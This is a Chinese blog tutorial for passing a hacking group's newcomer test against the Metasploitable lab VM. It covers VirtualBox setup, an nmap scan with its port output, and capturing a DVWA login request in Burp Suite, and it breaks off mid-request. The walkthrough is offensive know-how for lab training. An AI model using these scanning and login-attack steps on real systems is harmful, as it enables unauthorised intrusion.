<!DOCTYPE html>
<html><head>
<title>锏幕 新人四项考核教程</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="新人过审核的参考教程">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">











<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">


  






<link rel="stylesheet" href="http://weepingdogel.github.io/scss/journal.min.3f72a5fc8f5b5dd732a4b476aced0eece2156958d9d414316494ddb10593ddf7.css" integrity="sha256-P3Kl/I9bXdcypLR2rO0O7OIVaVjZ1BQxZJTdsQWT3fc=" media="screen">



<link rel="stylesheet" href="http://weepingdogel.github.io/scss/dark-mode.min.f7c2efa7183435a6bd1842f91c541481c7a5137b5991629a870f24e4a516ad4b.css" integrity="sha256-98Lvpxg0Naa9GEL5HFQUgcelE3tZkWKahw8k5KUWrUs=" media="screen">


<script src="/vendor/js/loadCSS.js"></script>
<script>
  loadCSS("https://fonts.googleapis.com/css?family=Fira+Mono|Material+Icons");
</script>

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8465793241118966"
     crossorigin="anonymous"></script>





  <script src="/js/toc.js"></script>














</head>
<body>
    	<div id="app"><div id="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="http://weepingdogel.github.io/">
    
        <div class="nav-title">
            WeepingDogel
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/">
                文章
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/tags/">
                标签
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/categories/">
                分类
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/about/">
                关于
            </a>
            
        
    </div>

    

    <div class="nav-footer">
        
 <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a>  <a href="https://amazingrise.net">Rise</a>
<br>
 <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	2021 WeepingDogel
	

    </div>
    
</div><div id="extraContainer" class="extra-container">
    
    
    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">


	<div class="toc-content">
	
		
		
		
		<center>-  -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e5%bc%80%e5%9c%ba%e7%99%bd" onclick="onNavClick(`#开场白-nav`)" id="开场白-nav">
									开场白
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e8%80%83%e6%a0%b8%e5%86%85%e5%ae%b9" onclick="onNavClick(`#考核内容-nav`)" id="考核内容-nav">
									考核内容
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%8e%af%e5%a2%83%e5%87%86%e5%a4%87" onclick="onNavClick(`#环境准备-nav`)" id="环境准备-nav">
									环境准备
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e7%ac%ac%e4%b8%80%e6%ad%a5%e4%b8%8b%e8%bd%bd%e8%a7%a3%e5%8e%8b" onclick="onNavClick(`#第一步下载解压-nav`)" id="第一步下载解压-nav">
									第一步|下载&amp;解压
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%ac%ac%e4%ba%8c%e6%ad%a5%e5%88%9b%e5%bb%ba%e8%99%9a%e6%8b%9f%e6%9c%ba" onclick="onNavClick(`#第二步创建虚拟机-nav`)" id="第二步创建虚拟机-nav">
									第二步|创建虚拟机
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e8%80%83%e6%a0%b8%e8%bf%87%e7%a8%8b" onclick="onNavClick(`#考核过程-nav`)" id="考核过程-nav">
									考核过程
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e5%97%85%e6%8e%a2%e6%89%ab%e6%8f%8f" onclick="onNavClick(`#嗅探扫描-nav`)" id="嗅探扫描-nav">
									嗅探！扫描！
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%ac%ac%e4%b8%80%e5%85%b3%e7%ae%80%e5%8d%95%e7%a0%b4%e8%a7%a3web%e8%a1%a8%e5%8d%95" onclick="onNavClick(`#第一关简单破解web表单-nav`)" id="第一关简单破解web表单-nav">
									第一关|简单破解Web表单
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%8a%93%e5%8c%85" onclick="onNavClick(`#抓包-nav`)" id="抓包-nav">
									抓包
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%88%86%e7%a0%b4" onclick="onNavClick(`#爆破-nav`)" id="爆破-nav">
									爆破
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%ac%ac%e4%ba%8c%e5%85%b3%e7%ae%80%e5%8d%95sql%e6%b3%a8%e5%85%a5" onclick="onNavClick(`#第二关简单sql注入-nav`)" id="第二关简单sql注入-nav">
									第二关|简单SQL注入
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%8a%93%e5%8c%85-1" onclick="onNavClick(`#抓包-1-nav`)" id="抓包-1-nav">
									抓包
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bd%bf%e7%94%a8sqlmap%e6%b3%a8%e5%85%a5" onclick="onNavClick(`#使用sqlmap注入-nav`)" id="使用sqlmap注入-nav">
									使用sqlmap注入
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%ac%ac%e4%b8%89%e5%85%b3%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e6%b8%97%e9%80%8f" onclick="onNavClick(`#第三关操作系统渗透-nav`)" id="第三关操作系统渗透-nav">
									第三关|操作系统渗透
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e7%94%9f%e6%88%90%e6%9c%a8%e9%a9%ac" onclick="onNavClick(`#生成木马-nav`)" id="生成木马-nav">
									生成木马
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%ac%ac%e5%9b%9b%e5%85%b3%e8%8e%b7%e5%8f%96root%e6%9d%83%e9%99%90" onclick="onNavClick(`#第四关获取root权限-nav`)" id="第四关获取root权限-nav">
									第四关|获取root权限
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%bb%93%e8%af%ad" onclick="onNavClick(`#结语-nav`)" id="结语-nav">
									结语
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" onclick="onNavClick(`#参考链接-nav`)" id="参考链接-nav">
									参考链接
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
    
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a type="button" class="pagination-action" id="darkModeToggleButton">
            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
                dark_mode
            </span>
        </a>
        
        
    </div>
</div>
<div class="single-column-drawer-container" id="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/">
                    文章
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/tags/">
                    标签
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/categories/">
                    分类
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/about/">
                    关于
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>-  -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e5%bc%80%e5%9c%ba%e7%99%bd" onclick="onNavClick(`#开场白-nav`)" id="开场白-nav">
									开场白
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e8%80%83%e6%a0%b8%e5%86%85%e5%ae%b9" onclick="onNavClick(`#考核内容-nav`)" id="考核内容-nav">
									考核内容
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%8e%af%e5%a2%83%e5%87%86%e5%a4%87" onclick="onNavClick(`#环境准备-nav`)" id="环境准备-nav">
									环境准备
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e7%ac%ac%e4%b8%80%e6%ad%a5%e4%b8%8b%e8%bd%bd%e8%a7%a3%e5%8e%8b" onclick="onNavClick(`#第一步下载解压-nav`)" id="第一步下载解压-nav">
									第一步|下载&amp;解压
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%ac%ac%e4%ba%8c%e6%ad%a5%e5%88%9b%e5%bb%ba%e8%99%9a%e6%8b%9f%e6%9c%ba" onclick="onNavClick(`#第二步创建虚拟机-nav`)" id="第二步创建虚拟机-nav">
									第二步|创建虚拟机
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e8%80%83%e6%a0%b8%e8%bf%87%e7%a8%8b" onclick="onNavClick(`#考核过程-nav`)" id="考核过程-nav">
									考核过程
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e5%97%85%e6%8e%a2%e6%89%ab%e6%8f%8f" onclick="onNavClick(`#嗅探扫描-nav`)" id="嗅探扫描-nav">
									嗅探！扫描！
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%ac%ac%e4%b8%80%e5%85%b3%e7%ae%80%e5%8d%95%e7%a0%b4%e8%a7%a3web%e8%a1%a8%e5%8d%95" onclick="onNavClick(`#第一关简单破解web表单-nav`)" id="第一关简单破解web表单-nav">
									第一关|简单破解Web表单
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%8a%93%e5%8c%85" onclick="onNavClick(`#抓包-nav`)" id="抓包-nav">
									抓包
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%88%86%e7%a0%b4" onclick="onNavClick(`#爆破-nav`)" id="爆破-nav">
									爆破
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%ac%ac%e4%ba%8c%e5%85%b3%e7%ae%80%e5%8d%95sql%e6%b3%a8%e5%85%a5" onclick="onNavClick(`#第二关简单sql注入-nav`)" id="第二关简单sql注入-nav">
									第二关|简单SQL注入
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%8a%93%e5%8c%85-1" onclick="onNavClick(`#抓包-1-nav`)" id="抓包-1-nav">
									抓包
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bd%bf%e7%94%a8sqlmap%e6%b3%a8%e5%85%a5" onclick="onNavClick(`#使用sqlmap注入-nav`)" id="使用sqlmap注入-nav">
									使用sqlmap注入
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%ac%ac%e4%b8%89%e5%85%b3%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e6%b8%97%e9%80%8f" onclick="onNavClick(`#第三关操作系统渗透-nav`)" id="第三关操作系统渗透-nav">
									第三关|操作系统渗透
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e7%94%9f%e6%88%90%e6%9c%a8%e9%a9%ac" onclick="onNavClick(`#生成木马-nav`)" id="生成木马-nav">
									生成木马
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%ac%ac%e5%9b%9b%e5%85%b3%e8%8e%b7%e5%8f%96root%e6%9d%83%e9%99%90" onclick="onNavClick(`#第四关获取root权限-nav`)" id="第四关获取root权限-nav">
									第四关|获取root权限
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%bb%93%e8%af%ad" onclick="onNavClick(`#结语-nav`)" id="结语-nav">
									结语
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" onclick="onNavClick(`#参考链接-nav`)" id="参考链接-nav">
									参考链接
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div id="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a id="navTitle" class="navbar-brand" href="http://weepingdogel.github.io/">
            WeepingDogel
        </a>
        
        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
            <i class="material-icons" id="darkModeToggleIcon2">
                dark_mode
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" id="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="http://weepingdogel.github.io/">
        <div class="single-column-header-title">WeepingDogel</div>
        

    </a>
</div>

            <div id="content">
                <div id="streamContainer" class="stream-container">

    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            

            <div class="post-head-wrapper-text-only"
                
            >
                <div class="post-title">
                    锏幕 新人四项考核教程
                    
                    <div class="post-subtitle">
                        新人过审核的参考教程
                    </div>
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            
                        </time>
                        

                        
                            <i class="material-icons" style="">folder</i>
                                <a href="/categories/">[渗透测试]</a>
                                &nbsp;
                        

                        
                            <i class="material-icons" style="">label</i>
                            
                                <a href="/tags/%E7%AC%94%E8%AE%B0">笔记</a>
                                &nbsp;
                            
                                <a href="/tags/linux">Linux</a>
                                &nbsp;
                            
                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>
                                &nbsp;
                            
                                <a href="/tags/%E9%BB%91%E5%AE%A2">黑客</a>
                                &nbsp;
                            
                        
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <p><strong>注意事项：本期内容中的IP地址可能与你的实际情况不同！！请根据实际情况更改对应IP地址！！</strong></p>
<h2 id="开场白">开场白</h2>
<p>诶嘿～！我又回来了，我看到很多萌新不知道怎么过锏幕的新人考核，特意为此写篇博客做个教程。</p>
<p>好让你们看完过一下，那么…</p>
<p>嘛.. 我们开始吧..</p>
<h2 id="考核内容">考核内容</h2>
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th style="text-align:left">内容</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">名称</td>
<td style="text-align:left">锏幕四项萌新考核</td>
<td style="text-align:left">考核的名称</td>
</tr>
<tr>
<td style="text-align:center">难度</td>
<td style="text-align:left">Low</td>
<td style="text-align:left">难度系数</td>
</tr>
<tr>
<td style="text-align:center">第一关</td>
<td style="text-align:left">简单破解Web表单</td>
<td style="text-align:left">必须通过，否则无法进行下一关</td>
</tr>
<tr>
<td style="text-align:center">第二关</td>
<td style="text-align:left">简单SQL注入</td>
<td style="text-align:left">必须通过</td>
</tr>
<tr>
<td style="text-align:center">第三关</td>
<td style="text-align:left">操作系统渗透</td>
<td style="text-align:left">必须通过</td>
</tr>
<tr>
<td style="text-align:center">第四关</td>
<td style="text-align:left">获取root权限</td>
<td style="text-align:left">必须通过</td>
</tr>
</tbody>
</table>
<p><strong>PS：锏幕组织的新人考核是以metasploitable作为标准的，因此我会写出如何准备环境</strong></p>
<h2 id="环境准备">环境准备</h2>
<p>上面已经说明了需要用到<strong>metasploitable</strong>，那么接下来我会写出如何配置靶机环境</p>
<h3 id="第一步下载解压">第一步|下载&amp;解压</h3>
<p>首先我们需要去下载metasploitable这个靶机套餐的虚拟机文件，我们可以在各种搜索引擎中找到它我这里会给出地址。</p>
<p><a href="https://sourceforge.net/projects/metasploitable/">点击这里可以下载</a></p>
<p>点进去以后点击那个巨大的<strong>Download</strong>即可下载。</p>
<p>嘛..我已经下载好了，是个<strong>zip</strong>文件。</p>
<p>然后你需要解压，两种方法:</p>
<ul>
<li>Linux
<ul>
<li>unzip命令</li>
<li>file-roller(GUI)</li>
</ul>
</li>
<li>Windows
<ul>
<li>各种解压软件</li>
</ul>
</li>
</ul>
<p>这个不用多说吧..</p>
<p><strong>解压个东西都不会还想加入锏幕?</strong></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_05-52-55.png" alt=""></p>
<p>解压完了就可以进行下一步了。</p>
<h3 id="第二步创建虚拟机">第二步|创建虚拟机</h3>
<p>你打开文件夹就可以看到这里面有个虚拟机配置文件和一个虚拟硬盘文件，它可以直接用VMware导入运行，因此我这里给出VirtualBox的方法</p>
<p>首先，打开你的VirtualBox</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_05-58-44.png" alt=""></p>
<p>然后点击上面的新建…(这个还要教吗?)</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_05-59-53.png" alt=""></p>
<p>然后选择的虚拟机类型和操作系统版本，<strong>这里要注意！！必须选“64位的其他Linux”，并且设置至少256MB的内存！否则无法启动！</strong>
<img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-00-34.png" alt=""></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-02-10.png" alt=""></p>
<p>然后这里就<strong>不用创建虚拟硬盘</strong>了，我们选择<strong>使用现有的虚拟硬盘文件</strong>。</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-04-29.png" alt=""></p>
<p>点击这个东西，</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-05-21.png" alt=""></p>
<p>然后点击<strong>注册</strong></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-07-17.png" alt=""></p>
<p>找到你的<strong>metasploitable</strong>目录并且找到这个<strong>vmdk文件</strong>，这个就是虚拟硬盘文件。</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-08-57.png" alt=""></p>
<p>点击打开，然后就会回到这个窗口，选择你刚刚注册的虚拟硬盘。</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-11-10.png" alt=""></p>
<p>接下来就可以创建了</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-12-03.png" alt=""></p>
<p><strong>在启动之前要把虚拟机的联网改成桥接</strong></p>
<p><strong>依次点击设置——网络</strong></p>
<p>然后就会跳出这个页面</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-16-46.png" alt=""></p>
<p>将它改成桥接网卡即可</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-17-25.png" alt=""></p>
<p>最后启动虚拟机，你的靶机环境就搭建完成了。
<img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-12-40.png" alt="">
<img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-18-39.png" alt=""></p>
<p>开机之后<strong>不要去操作靶机</strong>也<strong>不要去理会它</strong></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-19-35.png" alt=""></p>
<h2 id="考核过程">考核过程</h2>
<p>现在环境已经准备完毕了，我们可以开始进行过关了。接下来请<strong>认真看！认真看！认真看！</strong>（重要的事情说三遍）</p>
<h3 id="嗅探扫描">嗅探！扫描！</h3>
<p>我们刚刚搭建完靶机却不知道它的<strong>IP地址</strong>，这意味着我们不知道<strong>它的位置</strong>，那么怎么办呢？这个时候我们要用到<strong>nmap</strong>把他扫出来。</p>
<p>不过前提是首先你得知道你所处的IP段，我的环境是局域网，DHCP地址段是<code>192.168.0.1/24</code></p>
<p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -v -O 192.168.0.1/24
</span></span><span class="line"><span class="cl">!<span class="o">[](</span>/img/截图_2019-10-20_06-27-08.png<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以发现它很快就扫出来了</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-31-32.png" alt=""></p>
<p>终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.107
</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
</span></span><span class="line"><span class="cl">Not shown: 977 closed ports
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp   open  ftp
</span></span><span class="line"><span class="cl">22/tcp   open  ssh
</span></span><span class="line"><span class="cl">23/tcp   open  telnet
</span></span><span class="line"><span class="cl">25/tcp   open  smtp
</span></span><span class="line"><span class="cl">53/tcp   open  domain
</span></span><span class="line"><span class="cl">80/tcp   open  http
</span></span><span class="line"><span class="cl">111/tcp  open  rpcbind
</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
</span></span><span class="line"><span class="cl">512/tcp  open  exec
</span></span><span class="line"><span class="cl">513/tcp  open  login
</span></span><span class="line"><span class="cl">514/tcp  open  shell
</span></span><span class="line"><span class="cl">1099/tcp open  rmiregistry
</span></span><span class="line"><span class="cl">1524/tcp open  ingreslock
</span></span><span class="line"><span class="cl">2049/tcp open  nfs
</span></span><span class="line"><span class="cl">2121/tcp open  ccproxy-ftp
</span></span><span class="line"><span class="cl">3306/tcp open  mysql
</span></span><span class="line"><span class="cl">5432/tcp open  postgresql
</span></span><span class="line"><span class="cl">5900/tcp open  vnc
</span></span><span class="line"><span class="cl">6000/tcp open  X11
</span></span><span class="line"><span class="cl">6667/tcp open  irc
</span></span><span class="line"><span class="cl">8009/tcp open  ajp13
</span></span><span class="line"><span class="cl">8180/tcp open  unknown
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:3F:40:18 (Oracle VirtualBox virtual NIC)
</span></span><span class="line"><span class="cl">Device type: general purpose
</span></span><span class="line"><span class="cl">Running: Linux 2.6.X
</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6
</span></span><span class="line"><span class="cl">OS details: Linux 2.6.9 - 2.6.33
</span></span><span class="line"><span class="cl">Uptime guess: 0.002 days (since Sun Oct 20 06:23:17 2019)
</span></span><span class="line"><span class="cl">Network Distance: 1 hop
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=192 (Good luck!)
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
</span></span></code></pre></td></tr></table>
</div>
</div><p>那么我已经找到靶机了，接下来就可以正式进行攻击了。</p>
<h3 id="第一关简单破解web表单">第一关|简单破解Web表单</h3>
<p>接下来我们在浏览器输入刚刚扫描到的地址，就可以进入靶机上的网页了。</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-41-20.png" alt=""></p>
<blockquote>
<p>小白：唔？为什么你的IP不是上面写的107了，变成4了</p>
<p>回答：我写着写着就断网了，搭建了一个虚拟局域网，所以靶机IP变了，又重新扫了一遍。。但是正常情况下，这个IP是不会变的，所以请无视这个地址具体是多少了，每个人都不一样的。</p>
</blockquote>
<p>接下来我们点击<strong>DVWA</strong>，进入了一个这样的帐号密码登录页面，我们第一关的目的就是破解它。</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-45-23.png" alt=""></p>
<p>QwQ，然后..是不是到这里就一脸懵逼了</p>
<h4 id="抓包">抓包</h4>
<p>嘛，记得<strong>Burpsuite</strong>吗？</p>
<p>就是一个java写的软件</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-51-38.png" alt=""></p>
<p>试试？</p>
<p>在使用Burpsuite之前，你需要给浏览器设置burp的代理，我这里使用的是firefox</p>
<p>那么，在burpsuite里面依次点击</p>
<p><code>Proxy（左上角内个）——Options</code></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-56-54.png" alt=""></p>
<p>从这里我们就获得了burp默认的代理地址<code>127.0.0.1:8080</code></p>
<p>接下来要到浏览器里设置它，</p>
<p>简单地给出截图吧</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-02-05.png" alt=""></p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-03-59.png" alt=""></p>
<p>然后点确定，就这样设置好了</p>
<p>嘛…<strong>浏览器都不会用</strong>的也别来锏幕了</p>
<p>然后回到burp，确认一下这个<strong>Intercept</strong>是否为<strong>on</strong>，如果是就进行下一步操作，如果不是就点一下。。。</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-06-34.png" alt=""></p>
<p>接下来，回到浏览器</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-09-10.png" alt=""></p>
<p>emmmm….我们知道一般网站的默认管理员帐号都是<strong>admin</strong>，这里也不例外，接下来我们试着在Username这个框框里输入<code>admin</code>，<strong>Password</strong>这个框框里随便输入点什么</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-11-43.png" alt=""></p>
<p>然后点击<strong>login</strong>。</p>
<p>接下来我们就抓取到了这个数据包了，下面还有我输入过的信息</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-13-04.png" alt=""></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/dvwa/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.0.4</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
